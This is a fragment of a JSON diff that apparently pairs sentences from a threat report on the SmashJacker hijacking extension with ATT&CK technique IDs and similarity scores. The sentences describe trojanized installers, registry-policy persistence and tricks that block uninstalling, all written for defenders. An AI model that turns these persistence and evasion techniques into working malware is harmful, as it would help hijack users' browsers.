+        "sentence": "Additionally, we observed historical trends of known ChromeLoader delivery formats, from their first variants delivering AutoHotkey files, to the more popular variant delivered via disc image files.",
+        "score": 0.3646
+      },
+      {
+        "sentence": "When we added on the timeline of incidents related to the installer media, we ended up with a graph that appeared to show a convincing story of shifting trends in ChromeLoader delivery media.",
+        "score": 0.3518
+      },
+      {
+        "sentence": "But the usage of pirated media sites and similar naming conventions aren't unique to ChromeLoader and may just be indicative of a different set of actors that offer their distribution network as a service for many different payloads.",
+        "score": 0.3744
+      },
+      {
+        "sentence": "The timeline may be tainted due to lack of awareness of other changes in ChromeLoader techniques that may have affected our ability to tag related incidents.",
+        "score": 0.3709
+      },
+      {
+        "sentence": "Additionally, during our search for ChromeLoader samples that were starting to use installers that ended up turning up results for a different malicious extension, we actually did end up finding a recent msi sample that does drop already known ChromeLoader payloads, which only muddied the waters further.",
+        "score": 0.3387
+      },
+      {
+        "sentence": "It may be the case that the actors behind ChromeLoader also developed this extension and delivery path, but currently we don't have any other data that would warrant higher confidence in this hypothesis.",
+        "score": 0.4172
+      },
+      {
+        "sentence": "One word kept recurring in various places during the investigation, Smash.",
+        "score": 0.3292
+      },
+      {
+        "sentence": "Outside of the post-install victim tracking pages, this web site also offers a browser, search results for which are full of guides on how to remove it as adware.",
+        "score": 0.3071
+      },
+      {
+        "sentence": "Spotting the similarities between the two is left to the reader.",
+        "score": 0.3123
+      },
+      {
+        "sentence": "These potential connections suggest a much broader operation with many possible delivery avenues and payloads, and potential connections to ChromeLoader, with the goal of generating revenue via ads and affiliate kickbacks.",
+        "score": 0.3575
+      }
+    ],
+    "T1204.002": [
+      {
+        "sentence": "In February and March, we noticed a surge in incidents all relating to a few different files that hadn't been connected to any type of malware yet.",
+        "score": 0.4049
+      },
+      {
+        "sentence": "Pivoting off the indicators from these findings, the CRU uncovered a campaign spanning back to at least October of 2022 pushing a persistent Chromium extension via software, game, and movie pirating web pages that we are referring to as SmashJacker.",
+        "score": 0.3733
+      },
+      {
+        "sentence": "Users are lured to download the installer files by having them hosted on pages advertising the download of wallpapers, software, games, and movies, typically illegally.",
+        "score": 0.6711
+      },
+      {
+        "sentence": "They are first served the malicious installer, but then trying the download again will serve the proper file.",
+        "score": 0.5188
+      },
+      {
+        "sentence": "It's worth noting that in all the URLs leading to an installer download contain the empty URL parameter 7fk8qechol=.",
+        "score": 0.3988
+      },
+      {
+        "sentence": "Throughout our analysis, we found mostly InnoSetup and MSI installers being used to deliver this malicious extension.",
+        "score": 0.4416
+      },
+      {
+        "sentence": "The MSI installers were all trojanized versions of 7zip that would deliver the extension along with a legitimate install of the archiving tool.",
+        "score": 0.3451
+      },
+      {
+        "sentence": "InnoSetup installers only installed the extension, but masqueraded as either one of the types of files outlined above or were simply named Your File Is Ready To Download.exe.",
+        "score": 0.468
+      },
+      {
+        "sentence": "Both versions deliver similar payloads, and in some cases, if a targeted browser isn't found, nothing will be dropped.",
+        "score": 0.3708
+      },
+      {
+        "sentence": "Soon after launching the installer, it gets to work on persisting.",
+        "score": 0.4405
+      },
+      {
+        "sentence": "We found two persistence techniques in use depending on the variant downloaded.",
+        "score": 0.3176
+      },
+      {
+        "sentence": "Then it will create a batch file for running the proper browser with the malicious extension loaded.",
+        "score": 0.4706
+      },
+      {
+        "sentence": "In other instances, the installer will drop and run an executable that takes responsibility for its own persistence.",
+        "score": 0.4171
+      },
+      {
+        "sentence": "In some variations is tries to kill Chrome, Brave, Opera, Vivaldi, and Edge.",
+        "score": 0.3065
+      },
+      {
+        "sentence": "Then it restarts the targeted browser and passes it a path to a bootstrapping extension through the --load-extension parameter.",
+        "score": 0.3368
+      },
+      {
+        "sentence": "In the dll versions of the extension there is no .crx file or bootstrapping extension, just what would be the contents of the .crx file.",
+        "score": 0.3345
+      },
+      {
+        "sentence": "Immediately after the installation is completed, the targeted browser is then opened directly to an actor-controlled page: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://getfiles[.]wiki/welcome.php This will be a part of a redirection chain through pages such as https://exturl[.]com/r.php?key=[KEY] or https://offersss[.]click/r.php?payout=OPTIONAL&cnv_id=[ID].",
+        "score": 0.5292
+      },
+      {
+        "sentence": "An example is included below.",
+        "score": 0.3461
+      },
+      {
+        "sentence": "Things get a bit more interesting when background.js contains the main logic of the extension.",
+        "score": 0.3366
+      },
+      {
+        "sentence": "In these cases, we are faced with a lightly obfuscated script with more features than just search hijacking.",
+        "score": 0.3001
+      },
+      {
+        "sentence": "This is done to redirect the user back to it in an attempt for the actor to receive affiliate kickbacks.",
+        "score": 0.4301
+      },
+      {
+        "sentence": "Our initial hypothesis was that this campaign represented a shift in ChromeLoader delivery methods.",
+        "score": 0.4111
+      },
+      {
+        "sentence": "The usage of pages pushing pirated media to lure victims, file name conventions such as the common Your File Is Ready To Download, and the eventual payload of a search hijacking browser extension hinted in the direction of ChromeLoader.",
+        "score": 0.4332
+      },
+      {
+        "sentence": "Additionally, we observed historical trends of known ChromeLoader delivery formats, from their first variants delivering AutoHotkey files, to the more popular variant delivered via disc image files.",
+        "score": 0.4553
+      },
+      {
+        "sentence": "When we added on the timeline of incidents related to the installer media, we ended up with a graph that appeared to show a convincing story of shifting trends in ChromeLoader delivery media.",
+        "score": 0.4616
+      },
+      {
+        "sentence": "But the usage of pirated media sites and similar naming conventions aren't unique to ChromeLoader and may just be indicative of a different set of actors that offer their distribution network as a service for many different payloads.",
+        "score": 0.3175
+      },
+      {
+        "sentence": "Additionally, during our search for ChromeLoader samples that were starting to use installers that ended up turning up results for a different malicious extension, we actually did end up finding a recent msi sample that does drop already known ChromeLoader payloads, which only muddied the waters further.",
+        "score": 0.3865
+      },
+      {
+        "sentence": "It may be the case that the actors behind ChromeLoader also developed this extension and delivery path, but currently we don't have any other data that would warrant higher confidence in this hypothesis.",
+        "score": 0.3444
+      },
+      {
+        "sentence": "Some installers quickly showed they were installing something called Smash.",
+        "score": 0.3248
+      },
+      {
+        "sentence": "Particularly there is the smashbrowser[.]com domain that victims are sent to, in some cases, immediately after install.",
+        "score": 0.6273
+      },
+      {
+        "sentence": "Outside of the post-install victim tracking pages, this web site also offers a browser, search results for which are full of guides on how to remove it as adware.",
+        "score": 0.3303
+      },
+      {
+        "sentence": "Spotting the similarities between the two is left to the reader.",
+        "score": 0.4336
+      }
+    ],
+    "T1546.010": [
+      {
+        "sentence": "In February and March, we noticed a surge in incidents all relating to a few different files that hadn't been connected to any type of malware yet.",
+        "score": 0.3469
+      },
+      {
+        "sentence": "Pivoting off the indicators from these findings, the CRU uncovered a campaign spanning back to at least October of 2022 pushing a persistent Chromium extension via software, game, and movie pirating web pages that we are referring to as SmashJacker.",
+        "score": 0.3878
+      },
+      {
+        "sentence": "This extension is used to hijack searches and push users through redirect chains to the domains they're navigating so the actors can receive affiliate kickbacks for \"directing\" the user to that site, generate ad revenue, and collect analytics on victims.",
+        "score": 0.3043
+      },
+      {
+        "sentence": "Users are lured to download the installer files by having them hosted on pages advertising the download of wallpapers, software, games, and movies, typically illegally.",
+        "score": 0.3791
+      },
+      {
+        "sentence": "They are first served the malicious installer, but then trying the download again will serve the proper file.",
+        "score": 0.3857
+      },
+      {
+        "sentence": "It's worth noting that in all the URLs leading to an installer download contain the empty URL parameter 7fk8qechol=.",
+        "score": 0.3953
+      },
+      {
+        "sentence": "Throughout our analysis, we found mostly InnoSetup and MSI installers being used to deliver this malicious extension.",
+        "score": 0.4423
+      },
+      {
+        "sentence": "The MSI installers were all trojanized versions of 7zip that would deliver the extension along with a legitimate install of the archiving tool.",
+        "score": 0.3749
+      },
+      {
+        "sentence": "InnoSetup installers only installed the extension, but masqueraded as either one of the types of files outlined above or were simply named Your File Is Ready To Download.exe.",
+        "score": 0.3695
+      },
+      {
+        "sentence": "Both versions deliver similar payloads, and in some cases, if a targeted browser isn't found, nothing will be dropped.",
+        "score": 0.4277
+      },
+      {
+        "sentence": "Most of the samples were signed using a handful of different certificates.",
+        "score": 0.3387
+      },
+      {
+        "sentence": "Soon after launching the installer, it gets to work on persisting.",
+        "score": 0.5167
+      },
+      {
+        "sentence": "We found two persistence techniques in use depending on the variant downloaded.",
+        "score": 0.5309
+      },
+      {
+        "sentence": "Then it will create a batch file for running the proper browser with the malicious extension loaded.",
+        "score": 0.3366
+      },
+      {
+        "sentence": "In other instances, the installer will drop and run an executable that takes responsibility for its own persistence.",
+        "score": 0.567
+      },
+      {
+        "sentence": "Then it restarts the targeted browser and passes it a path to a bootstrapping extension through the --load-extension parameter.",
+        "score": 0.572
+      },
+      {
+        "sentence": "This is a smaller browser extension with two files usually called service.js and web.js.",
+        "score": 0.3619
+      },
+      {
+        "sentence": "This extension's whole purpose is to ensure the main extension gets loaded into the browser after being set in the registry. service.js adds a listener for installed extensions so that when its own installation triggers, it will open a tab with the chrome://policy page and call a function in web.js.",
+        "score": 0.548
+      },
+      {
+        "sentence": "This function adds a listener for when the chrome://policy page loads and clicks the reload policies button to ensure the policy registry keys modified earlier are loaded into the browser.",
+        "score": 0.4909
+      },
+      {
+        "sentence": "Meanwhile, the batch script is checking if the extension is installed yet, afterwards it will add its extension id to the browser's ExtensionInstallForcelist registry key, then kill the browser and restart it again without the bootstrapping extension loaded.",
+        "score": 0.4421
+      },
+      {
+        "sentence": "In the dll versions of the extension there is no .crx file or bootstrapping extension, just what would be the contents of the .crx file.",
+        "score": 0.3773
+      },
+      {
+        "sentence": "Immediately after the installation is completed, the targeted browser is then opened directly to an actor-controlled page: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://getfiles[.]wiki/welcome.php This will be a part of a redirection chain through pages such as https://exturl[.]com/r.php?key=[KEY] or https://offersss[.]click/r.php?payout=OPTIONAL&cnv_id=[ID].",
+        "score": 0.4789
+      },
+      {
+        "sentence": "The extension itself usually consists of three main components that can vary between samples.",
+        "score": 0.3768
+      },
+      {
+        "sentence": "The main logic of the extension is in one of the remaining two main components, sometimes in background.js and other times in content.js.",
+        "score": 0.3735
+      },
+      {
+        "sentence": "Things get a bit more interesting when background.js contains the main logic of the extension.",
+        "score": 0.4075
+      },
+      {
+        "sentence": "In these cases, we are faced with a lightly obfuscated script with more features than just search hijacking.",
+        "score": 0.3677
+      },
+      {
+        "sentence": "The search hijacking is still present, but now we are faced with evasion mechanisms such as closing tabs that try to navigate to the browser's ://extensions page or chrome://settings/reset to keep the extension from being uninstalled.",
+        "score": 0.3405
+      },
+      {
+        "sentence": "The bigger capability we see added is the ability to redirect users from a variety of different pages they may be trying to access through actor infrastructure and back out to the originally intended page with the actor's affiliate parameters tacked onto the URL.",
+        "score": 0.3
+      },
+      {
+        "sentence": "First, for every tab update it will check if a URL contains either 7fk8qechol, which was mentioned earlier in the article as an identifier for all of their initial payload delivery URLs, or the extension's id.",
+        "score": 0.3692
+      },
+      {
+        "sentence": "This is done to redirect the user back to it in an attempt for the actor to receive affiliate kickbacks.",
+        "score": 0.3019
+      },
+      {
+        "sentence": "Usually this will be 2 hours, except for an Amazon domain, which is granted a 24-hour waiting period.",
+        "score": 0.3301
+      },
+      {
+        "sentence": "The usage of pages pushing pirated media to lure victims, file name conventions such as the common Your File Is Ready To Download, and the eventual payload of a search hijacking browser extension hinted in the direction of ChromeLoader.",
+        "score": 0.4492
+      },
+      {
+        "sentence": "Additionally, we observed historical trends of known ChromeLoader delivery formats, from their first variants delivering AutoHotkey files, to the more popular variant delivered via disc image files.",
+        "score": 0.406
+      },
+      {
+        "sentence": "When we added on the timeline of incidents related to the installer media, we ended up with a graph that appeared to show a convincing story of shifting trends in ChromeLoader delivery media.",
+        "score": 0.3589
+      },
+      {
+        "sentence": "Occasionally we would also find other loose connections, such as a domain and URL patterned similarly to others used by the actors behind this extension redirecting to search hijack pages patterned similarly to those used by ChromeLoader.",
+        "score": 0.3635
+      },
+      {
+        "sentence": "But the usage of pirated media sites and similar naming conventions aren't unique to ChromeLoader and may just be indicative of a different set of actors that offer their distribution network as a service for many different payloads.",
+        "score": 0.3602
+      },
+      {
+        "sentence": "Additionally, during our search for ChromeLoader samples that were starting to use installers that ended up turning up results for a different malicious extension, we actually did end up finding a recent msi sample that does drop already known ChromeLoader payloads, which only muddied the waters further.",
+        "score": 0.5339
+      },
+      {
+        "sentence": "It may be the case that the actors behind ChromeLoader also developed this extension and delivery path, but currently we don't have any other data that would warrant higher confidence in this hypothesis.",
+        "score": 0.3622
+      },
+      {
+        "sentence": "Some installers quickly showed they were installing something called Smash.",
+        "score": 0.3946
+      },
+      {
+        "sentence": "Particularly there is the smashbrowser[.]com domain that victims are sent to, in some cases, immediately after install.",
+        "score": 0.3869
+      },
+      {
+        "sentence": "Outside of the post-install victim tracking pages, this web site also offers a browser, search results for which are full of guides on how to remove it as adware.",
+        "score": 0.3255
+      },
+      {
+        "sentence": "Further, through the domain smashaff[.]com we also connected the malicious extension here to a report by Guardio about a large amount of extensions available in Chrome and Edge stores very similar to the variants observed in our research.",
+        "score": 0.3907
+      },
+      {
+        "sentence": "These potential connections suggest a much broader operation with many possible delivery avenues and payloads, and potential connections to ChromeLoader, with the goal of generating revenue via ads and affiliate kickbacks.",
+        "score": 0.3461
+      }
+    ]
+  }
+}
